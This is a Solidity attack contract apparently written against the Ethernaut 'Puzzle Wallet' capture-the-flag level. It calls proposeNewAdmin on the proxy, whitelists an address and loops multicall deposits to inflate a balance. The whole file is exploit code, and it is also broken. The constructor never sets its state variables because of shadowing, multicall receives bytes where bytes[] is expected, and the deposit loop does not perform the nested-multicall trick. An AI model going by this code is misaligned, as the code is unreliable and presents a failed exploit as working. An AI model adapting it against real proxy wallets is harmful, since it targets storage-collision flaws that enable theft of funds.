pragma solidity ^0.8.0;

interface Proxy {
    function proposeNewAdmin(address) external;
}

interface PuzzleWallet {
    function addToWhitelist(address) external;

    function deposit() external payable;

    function multicall(bytes[] memory) external payable;
}

contract PuzzleAttack {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;
    PuzzleWallet public puzzleWallet;
    Proxy public proxyContract;

    constructor(address puzzleWallet, address proxy) public {
        owner = msg.sender;
        puzzleWallet = puzzleWallet;
        Proxy proxyContract = Proxy(proxy);
    }

    function proposeNewAdmin(address _proxyAd, address _newAdmin) public {
        proxyContract.proposeNewAdmin(_newAdmin);
    }

    function addToAdmin(address puzzle, address _newOwner) public {
        puzzleWallet.addToWhitelist(_newOwner);
    }

    function deposit() public payable {
        puzzleWallet.deposit();
    }

    function puzzleMulticall() public payable {
        uint256 times = 30;
        uint256 val = msg.value / 30;
        bytes memory data = abi.encodeWithSignature("deposit()");

        for (uint256 i = 0; i < times; i++) {
            puzzleWallet.multicall{value: val}(data);
        }
    }
}
